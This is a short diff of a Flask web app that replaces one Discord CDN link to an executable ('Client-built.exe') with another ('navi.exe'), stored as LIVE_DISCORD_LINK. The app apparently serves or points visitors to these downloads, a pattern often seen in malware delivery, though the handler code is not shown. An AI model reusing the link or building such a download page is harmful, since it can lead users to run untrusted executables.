@@ -4,7 +4,7 @@ from flask import Flask, request, render_template_string
 app = Flask(__name__)
 PORT = int(os.environ.get("PORT", 8000))
 
-LIVE_DISCORD_LINK = "https://cdn.discordapp.com/attachments/1522962798030753815/1524005183841894481/Client-built.exe?ex=6a4e2bee&is=6a4cda6e&hm=54462c8b75e6802a68969e986c9dcfc2a10b554768136bf49cee46fe62f85640&"
+LIVE_DISCORD_LINK = "https://cdn.discordapp.com/attachments/1520399304785788948/1524065627713704036/navi.exe?ex=6a4e6439&is=6a4d12b9&hm=4feec7cfd66b1457e5c4b625bd0af5121b828f2c8af0389a865996d19dd61f17&"
 
 @app.route('/')
 def handle_request():
